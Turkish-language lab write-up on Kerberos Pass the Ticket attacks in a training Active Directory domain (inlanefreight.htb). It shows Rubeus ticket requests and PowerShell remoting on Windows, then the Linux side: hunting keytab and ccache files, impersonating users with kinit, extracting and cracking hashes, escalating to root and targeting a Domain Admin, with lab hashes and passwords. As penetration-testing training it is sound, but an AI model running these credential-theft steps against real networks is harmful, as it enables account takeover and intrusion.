   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.3

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
[*] Using domain controller: 10.129.203.120:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```

## **Devam Ediyoruz**  

Şimdi bir Windows hostundan Pass the Ticket saldırıları gerçekleştirmenin çeşitli yollarını ele aldık. Bir sonraki bölümde aynı yanal hareket tekniğini bir Linux saldırı hostu kullanarak ele alacağız.


Soru : RDP ve sağlanan yetkileri kullanarak hedef makineye bağlanın. Bilgisayarda bulunan tüm biletleri dışa aktarın. Kaç kullanıcı TGT topladınız?
Cevap :3

1- ![Pasted image 20241105050331.png](/img/user/resimler/Pasted%20image%2020241105050331.png)

2- 
![Pasted image 20241105050519.png](/img/user/resimler/Pasted%20image%2020241105050519.png)

3- 3 adet kullancıı bileti var . 


Soru : John'un TGT'sini kullanarak Pass the Ticket saldırısı gerçekleştirin ve \\DC01.inlanefreight.htb\john paylaşımlı klasöründen bayrağı alın
Cevap : 

1- 
![Pasted image 20241105051444.png](/img/user/resimler/Pasted%20image%2020241105051444.png)

2- 
![Pasted image 20241105051623.png](/img/user/resimler/Pasted%20image%2020241105051623.png)

3-
![Pasted image 20241105051638.png](/img/user/resimler/Pasted%20image%2020241105051638.png)

4- dir \\DC01.inlanefreight.htb\john  komutunu çalıştıralım . 

![Pasted image 20241105051917.png](/img/user/resimler/Pasted%20image%2020241105051917.png)


Soru : Pass the Ticket saldırısı gerçekleştirmek için john'un TGT'sini kullanın ve PowerShell Remoting kullanarak DC01'e bağlanın. Bayrağı C:\john\john.txt dosyasından okuyun
Cevap : 

![Pasted image 20241105052938.png](/img/user/resimler/Pasted%20image%2020241105052938.png)

![Pasted image 20241105052958.png](/img/user/resimler/Pasted%20image%2020241105052958.png)

Soru :İsteğe bağlı: Saldırıları gerçekleştirmek için Mimikatz ve Rubeus araçlarının her ikisini de birbirlerine ihtiyaç duymadan kullanmaya çalışın. Bitirdiğinizde BİTTİ olarak işaretleyin.


# Pass the Ticket (PtT) from Linux
Yaygın olmamakla birlikte, Linux bilgisayarlar merkezi kimlik yönetimi sağlamak ve kuruluşun sistemleriyle entegre olmak için Active Directory'ye bağlanabilir ve kullanıcılara Linux ve Windows bilgisayarlarda kimlik doğrulama için tek bir kimliğe sahip olma olanağı verir.  

Active Directory'ye bağlı bir Linux bilgisayar genellikle kimlik doğrulama için Kerberos kullanır. Durumun böyle olduğunu ve Active Directory'ye bağlı bir Linux makineyi ele geçirmeyi başardığımızı varsayalım. Bu durumda, diğer kullanıcıların kimliğine bürünmek ve ağa daha fazla erişim sağlamak için Kerberos biletleri bulmaya çalışabiliriz.  

Bir Linux sistemi Kerberos biletlerini depolamak için çeşitli şekillerde yapılandırılabilir. Bu bölümde birkaç farklı depolama seçeneğini tartışacağız.  

**Not:** Active Directory'ye bağlı olmayan bir Linux makinesi, Kerberos biletlerini komut dosyalarında veya ağda kimlik doğrulaması yapmak için kullanabilir. Bir Linux makinesinden Kerberos biletlerini kullanmak için domain'e katılmış olmak şart değildir.


## **Linux üzerinde Kerberos**  

Windows ve Linux, Ticket Granting Ticket (TGT) ve Service Ticket (TGS) talep etmek için aynı prosesi kullanır. Ancak, bilet bilgilerini nasıl sakladıkları Linux dağıtımına ve uygulamasına bağlı olarak değişebilir.

Çoğu durumda, Linux makineleri Kerberos biletlerini `/tmp` dizininde [ccache dosyaları](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) olarak saklar. Varsayılan olarak, Kerberos biletinin konumu `KRB5CCNAME` ortam değişkeninde saklanır. Bu değişken, Kerberos biletlerinin kullanılıp kullanılmadığını veya Kerberos biletlerini saklamak için varsayılan konumun değiştirilip değiştirilmediğini belirleyebilir. Bu [ccache dosyaları](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) okuma ve yazma izinleriyle korunur, ancak yüksek ayrıcalıklara veya root ayrıcalıklarına sahip bir kullanıcı bu biletlere kolayca erişebilir.

Kerberos'un Linux'taki bir diğer günlük kullanımı [keytab](https://kb.iu.edu/d/aumh) dosyalarıdır. Bir [keytab](https://kb.iu.edu/d/aumh), Kerberos sorumluları ve şifrelenmiş anahtar çiftlerini (Kerberos parolasından türetilen) içeren bir dosyadır. Kerberos kullanarak çeşitli uzak sistemlere parola girmeden kimlik doğrulaması yapmak için bir keytab dosyası kullanabilirsiniz. Ancak, parolanızı değiştirdiğinizde, tüm keytab dosyalarınızı yeniden oluşturmanız gerekir.

[Keytab](https://kb.iu.edu/d/aumh) dosyaları genellikle komut dosyalarının insan etkileşimi veya düz metin dosyasında saklanan parolaya erişim gerektirmeden Kerberos kullanarak otomatik olarak kimlik doğrulaması yapmasına olanak tanır. Örneğin, bir komut dosyası Windows paylaşım klasöründe depolanan dosyalara erişmek için bir keytab dosyası kullanabilir.

**Not:** Kerberos client yüklü olan herhangi bir bilgisayar keytab dosyaları oluşturabilir. Keytab dosyaları bir bilgisayarda oluşturulabilir ve diğer bilgisayarlarda kullanılmak üzere kopyalanabilir, çünkü ilk oluşturuldukları sistemlerle sınırlı değildirler.


## **Senaryo**  

Kerberos'u bir Linux sisteminden nasıl kötüye kullanabileceğimizi anlamak ve pratik yapmak için, Domain Controller'a bağlı bir bilgisayarımız (`LINUX01`) var. Bu makineye yalnızca `MS01` üzerinden erişilebilir. Bu makineye SSH üzerinden erişmek için, RDP aracılığıyla `MS01` 'e bağlanabilir ve oradan Windows komut satırından SSH kullanarak Linux makineye bağlanabiliriz. Başka bir seçenek de port yönlendirmesi kullanmaktır.


#### **MS01 İmajından Linux Doğrulaması**
![Pasted image 20241105080239.png](/img/user/resimler/Pasted%20image%2020241105080239.png)

Alternatif olarak, `LINUX01` ile etkileşimi basitleştirmek için bir port yönlendirme oluşturduk. `MS01` üzerinde TCP/2222 portuna bağlanarak, `LINUX01` üzerinde TCP/22 portuna erişim elde edeceğiz.  

Yeni bir değerlendirmede olduğumuzu ve şirketin bize `LINUX01` 'e ve david@inlane `freight.htb` kullanıcısına ve `Password2` parolasına erişim verdiğini varsayalım.


#### **Port Yönlendirme ile Linux Auth**
```shell-session
M1R4CKCK@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 
```

## **Linux ve Active Directory Entegrasyonunun Tanımlanması**  

Bir domain'deki sistem kaydını yönetmek ve hangi domain kullanıcılarının veya gruplarının lokal sistem kaynaklarına erişmesine izin verileceğini ayarlamak için kullanılan bir araç olan [realm](“https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd”)'i kullanarak Linux makinenin domain'e bağlı olup olmadığını belirleyebiliriz.


#### **realm - Linux Makinenin Domain'e Katılıp Katılmadığını Kontrol Edin**
```shell-session
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Komutun çıktısı, makinenin bir Kerberos üyesi olarak yapılandırıldığını gösterir. Ayrıca bize domain adı (inlanefreight.htb) ve hangi kullanıcı ve grupların oturum açmasına izin verildiği hakkında bilgi verir, bu durumda David ve Julio kullanıcıları ve Linux Admins grubu vardır.

[Realm](“https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd”) 'in mevcut olmaması durumunda, Linux'u Active Directory ile entegre etmek için kullanılan [sssd](“https://sssd.io/”) veya [winbind](“https://www.samba.org/samba/docs/current/man-html/winbindd.8.html”) gibi diğer araçlara da bakabiliriz. Makinede çalışan bu hizmetleri aramak, domain'e bağlı olup olmadığını belirlemenin başka bir yoludur. Daha fazla ayrıntı için bu [blog yazısını](https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/) okuyabiliriz. Makinenin domain'e bağlı olup olmadığını doğrulamak için bu servisleri arayalım.


#### **Not - Linux Makinenin Domain'e Katılıp Katılmadığını Kontrol Edin**

```shell-session
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```

## **Linux'ta Kerberos Biletlerini Bulma**
Bir saldırgan olarak her zaman kimlik bilgilerini ararız. Linux domain'ine katılmış makinelerde, daha fazla erişim elde etmek için Kerberos biletlerini bulmak isteriz. Kerberos biletleri, Linux uygulamasına veya yöneticinin varsayılan ayarları değiştirmesine bağlı olarak farklı yerlerde bulunabilir. Kerberos biletlerini bulmanın bazı yaygın yollarını inceleyelim.

## **Keytab Dosyalarını Bulma**
Basit bir yaklaşım, adı `keytab` kelimesini içeren dosyaları aramak için `find` kullanmaktır. Bir yönetici genellikle bir script ile kullanılmak üzere bir Kerberos bileti oluşturduğunda, uzantıyı `.keytab` olarak ayarlar. Zorunlu olmamakla birlikte, bu, yöneticilerin genellikle bir keytab dosyasına başvurma yöntemidir.


#### **Adında Keytab Geçen Dosyaları Aramak için Find'ı Kullanma**
```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

```shell-session
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

<SNIP>

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```

**Not:** Bir keytab dosyasını kullanmak için, dosya üzerinde okuma ve yazma (rw) ayrıcalıklarına sahip olmamız gerekir.

`Keytab` dosyalarını bulmanın bir başka yolu da cronjob veya başka bir Linux servisi kullanılarak yapılandırılmış otomatik scriptlerdir. Bir yöneticinin Kerberos kullanan bir Windows hizmetiyle etkileşime geçmek için bir script çalıştırması gerekiyorsa ve keytab dosyası `.keytab` uzantısına sahip değilse, script içinde uygun dosya adını bulabiliriz. Bu örneği görelim:

#### **Cronjob'larda Keytab Dosyalarını Tanımlama**

```shell-session
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
<SNIP>
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```

Yukarıdaki betikte [kinit](“https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html”) kullanıldığını görüyoruz, bu da Kerberos'un kullanımda olduğu anlamına geliyor. [kinit](“https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html”) Kerberos ile etkileşime izin verir ve fonksiyonu kullanıcının TGT'sini talep etmek ve bu bileti önbellekte (ccache dosyası) saklamaktır. `Kinit` 'i oturumumuza bir `keytab` almak ve kullanıcı gibi davranmak için kullanabiliriz.  

Bu örnekte, paylaşılan bir klasöre bağlanmaya çalışmadan önce `svc_workstations@INLANEFREIGHT.HTB` kullanıcısı için bir Kerberos biletini (`svc_workstations.kt`) içe aktaran bir script bulduk. Daha sonra bu biletleri nasıl kullanacağımızı ve kullanıcıları nasıl taklit edeceğimizi tartışacağız.

**Not:** Windows'tan Pass the Ticket bölümünde tartıştığımız gibi, bir bilgisayar hesabının Active Directory ortamıyla etkileşime girmesi için bir bilete ihtiyacı vardır. Benzer şekilde, Linux domainine katılmış bir makinenin de bir bilete ihtiyacı vardır. Ticket, varsayılan olarak `/etc/krb5.key` tab adresinde bulunan ve yalnızca root kullanıcısı tarafından okunabilen bir keytab dosyası olarak temsil edilir. Bu bilete erişim sağlarsak, LINUX01$.INLANEFREIGHT.HTB bilgisayar hesabını taklit edebiliriz.

## Finding ccache Files

Bir kimlik bilgisi [cache](“https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html”) 'i veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) dosyası, Kerberos kimlik bilgilerini geçerli kaldıkları sürece ve genellikle kullanıcının oturumu sürdüğü sürece tutar. Bir kullanıcı domain'e kimlik doğrulaması yaptığında, bilet bilgilerini saklayan bir ccache dosyası oluşturulur. Bu dosyanın yolu `KRB5CCNAME` ortam değişkenine yerleştirilir. Bu değişken Kerberos kimlik doğrulamasını destekleyen araçlar tarafından Kerberos verilerini bulmak için kullanılır. Ortam değişkenlerini arayalım ve Kerberos kimlik bilgileri önbelleğimizin konumunu belirleyelim:


#### **ccache Dosyaları için Ortam Değişkenlerinin Gözden Geçirilmesi.**
```shell-session
david@inlanefreight.htb@linux01:~$ env | grep -i krb5

KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
```

Daha önce de belirtildiği gibi, `ccache` dosyaları varsayılan olarak `/tmp` adresinde bulunur. Bilgisayarda oturum açmış kullanıcıları arayabiliriz ve root veya ayrıcalıklı bir kullanıcı olarak erişim sağlarsak, hala geçerliyken `ccache` dosyasını kullanarak bir kullanıcının kimliğine bürünebiliriz.

#### **ccache Dosyalarını /tmp içinde arama**

```shell-session
david@inlanefreight.htb@linux01:~$ ls -la /tmp

total 68
drwxrwxrwt 13 root                     root                           4096 Oct  6 16:38 .
drwxr-xr-x 20 root                     root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 16:38 krb5cc_647401106_tBswau
-rw-------  1 david@inlanefreight.htb  domain users@inlanefreight.htb 1406 Oct  6 15:23 krb5cc_647401107_Gf415d
-rw-------  1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Oct  6 15:43 krb5cc_647402606_qd2Pfh
```

## **KeyTab Dosyalarının Kötüye Kullanımı**
Saldırganlar olarak, bir keytab dosyası için çeşitli kullanımlarımız olabilir. Yapabileceğimiz ilk şey `kinit` kullanarak bir kullanıcıyı taklit etmektir. Bir keytab dosyasını kullanmak için, hangi kullanıcı için oluşturulduğunu bilmemiz gerekir. `klist`, Linux'ta Kerberos ile etkileşim kurmak için kullanılan başka bir uygulamadır. Bu uygulama bir `keytab` dosyasından bilgi okur. Bunu aşağıdaki komut ile görelim:

#### **Keytab Dosya Bilgilerini Listeleme**
```shell-session
david@inlanefreight.htb@linux01:~$ klist -k -t /opt/specialfiles/carlos.keytab 

Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Bilet Carlos kullanıcısına karşılık gelir. Şimdi `kinit` ile kullanıcıyı taklit edebiliriz. Hangi bileti kullandığımızı `klist` ile doğrulayalım ve ardından Carlos'un biletini `kinit` ile oturumumuza aktaralım.  

**Not:** **kinit** büyük/küçük harfe duyarlıdır, bu nedenle klist'te gösterildiği gibi asıl adı kullandığınızdan emin olun. Bu durumda, kullanıcı adı küçük harf ve alan adı büyük harftir.

#### **Bir Keytab ile Kullanıcının Kimliğine Bürünme**

```shell-session
david@inlanefreight.htb@linux01:~$ klist 

Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: david@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:02:11
david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
david@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting     Expires            Service principal
10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/07/22 17:16:11
```


Erişimimizi onaylamak için `\\dc01\carlos` paylaşımlı klasörüne erişmeyi deneyebiliriz.

#### **SMB Share'e Carlos olarak bağlanma**
```shell-session
david@inlanefreight.htb@linux01:~$ smbclient //dc01/carlos -k -c ls

  .                                   D        0  Thu Oct  6 14:46:26 2022
  ..                                  D        0  Thu Oct  6 14:46:26 2022
  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022

                7706623 blocks of size 4096. 4452852 blocks available
```

**Not:** Geçerli oturumdaki bileti saklamak için, keytab'ı içe aktarmadan önce, mevcut ccache dosyasının bir kopyasını `KRB5CCNAME` ortam değişkenine kaydedin.

### Keytab Extract  

Linux'ta Kerberos'u kötüye kullanmak için kullanacağımız ikinci yöntem, bir keytab dosyasından gizli bilgileri çıkarmaktır. Domain'deki paylaşılan bir klasörü okumak için hesabın biletlerini kullanarak Carlos'un kimliğine bürünebildik, ancak Linux makinesindeki hesabına erişmek istiyorsak, şifresine ihtiyacımız olacak.  

Keytab dosyasından hash'leri çıkararak hesabın parolasını kırmayı deneyebiliriz. Linux kutularını Kerberos'a doğrulamak için kullanılabilen 502 tipi .keytab dosyalarından değerli bilgileri ayıklamak için bir araç olan [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)'ı kullanalım. Script, realm, Service Principal, Encryption Type ve Hashes gibi bilgileri ayıklayacaktır.


#### **KeyTabExtract ile Keytab Hash'lerini Çıkarma**
```shell-session
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

NTLM hash'i ile Pass the Hash saldırısı gerçekleştirebiliriz. AES256 veya AES128 hash'i ile Rubeus kullanarak biletlerimizi taklit edebilir veya düz metin parolasını elde etmek için hash'leri kırmayı deneyebiliriz.  

**Not:** Bir keytab dosyası farklı türde hash'ler içerebilir ve farklı kullanıcılardan bile olsa birden fazla kimlik bilgisi içerecek şekilde birleştirilebilir.

Kırılması en kolay hash NTLM hash'idir. Bunu kırmak için [Hashcat](https://hashcat.net/) veya [John the Ripper](https://www.openwall.com/john/) gibi araçları kullanabiliriz. Bununla birlikte, şifrelerin şifresini çözmenin hızlı bir yolu, milyarlarca şifre içeren [https://crackstation.net/](https://crackstation.net/) gibi çevrimiçi havuzlardır.

![Pasted image 20241105083331.png](/img/user/resimler/Pasted%20image%2020241105083331.png)

Resimde de görebileceğimiz gibi Carlos kullanıcısının parolası `Password5`. Artık Carlos olarak giriş yapabiliriz.

#### Log in as Carlos

```shell-session
david@inlanefreight.htb@linux01:~$ su - carlos@inlanefreight.htb

Password: 
carlos@inlanefreight.htb@linux01:~$ klist 
Ticket cache: FILE:/tmp/krb5cc_647402606_ZX6KFA
Default principal: carlos@INLANEFREIGHT.HTB

Valid starting       Expires              Service principal
10/07/2022 11:01:13  10/07/2022 21:01:13  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
        renew until 10/08/2022 11:01:13
```

### Daha Fazla Hash Elde Etme  

Carlos'un `svc_workstations.kt` adlı bir keytab dosyasını kullanan bir cronjob'u var. İşlemi tekrarlayabilir, şifreyi kırabilir ve `svc_workstations` olarak oturum açabiliriz .

## **Keytab ccache'in kötüye kullanılması**  

Bir ccache dosyasını kötüye kullanmak için tek ihtiyacımız olan şey dosya üzerinde okuma ayrıcalıklarına sahip olmaktır. Bu dosyalar `/tmp` içinde yer alır ve yalnızca onları oluşturan kullanıcı tarafından okunabilir, ancak root erişimi elde edersek onları kullanabiliriz.  

`svc_workstations` kullanıcısının kimlik bilgileriyle oturum açtıktan sonra `sudo -l` komutunu kullanabilir ve kullanıcının herhangi bir komutu root olarak çalıştırabileceğini doğrulayabiliriz. Kullanıcıyı root olarak değiştirmek için `sudo su` komutunu kullanabiliriz.


#### **Root'a Ayrıcalık Yükseltme**
```shell-session
M1R4CKCK@htb[/htb]$ ssh svc_workstations@inlanefreight.htb@10.129.204.23 -p 2222
                  
svc_workstations@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)          
...SNIP...

svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
[sudo] password for svc_workstations@inlanefreight.htb: 
Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_workstations@inlanefreight.htb may run the following commands on linux01:
    (ALL) ALL
svc_workstations@inlanefreight.htb@linux01:~$ sudo su
root@linux01:/home/svc_workstations@inlanefreight.htb# whoami
root
```

Root olarak, makinede hangi biletlerin bulunduğunu, bunların kime ait olduğunu ve son kullanma sürelerini belirlememiz gerekir.

#### Looking for ccache Files
```shell-session
root@linux01:~# ls -la /tmp

total 76
drwxrwxrwt 13 root                               root                           4096 Oct  7 11:35 .
drwxr-xr-x 20 root                               root                           4096 Oct  6  2021 ..
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
-rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_qMKxc6
-rw-------  1 david@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 10:43 krb5cc_647401107_O0oUWh
-rw-------  1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Oct  7 11:21 krb5cc_647401109_D7gVZF
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 3175 Oct  7 11:35 krb5cc_647402606
-rw-------  1 carlos@inlanefreight.htb           domain users@inlanefreight.htb 1433 Oct  7 11:01 krb5cc_647402606_ZX6KFA
```

Henüz erişim sağlayamadığımız bir kullanıcı (julio@inlanefreight.htb) var. Ait olduğu grupları `id` kullanarak doğrulayabiliriz.

#### **id Komutu ile Grup Üyeliğinin Tanımlanması**

```shell-session
root@linux01:~# id julio@inlanefreight.htb

uid=647401106(julio@inlanefreight.htb) gid=647400513(domain users@inlanefreight.htb) groups=647400513(domain users@inlanefreight.htb),647400512(domain admins@inlanefreight.htb),647400572(denied rodc password replication group@inlanefreight.htb)
```

Julio, `Domain Admins` grubunun bir üyesidir. Kullanıcının kimliğine bürünmeyi deneyebilir ve `DC01` Domain Controller host'una erişim elde edebiliriz.  

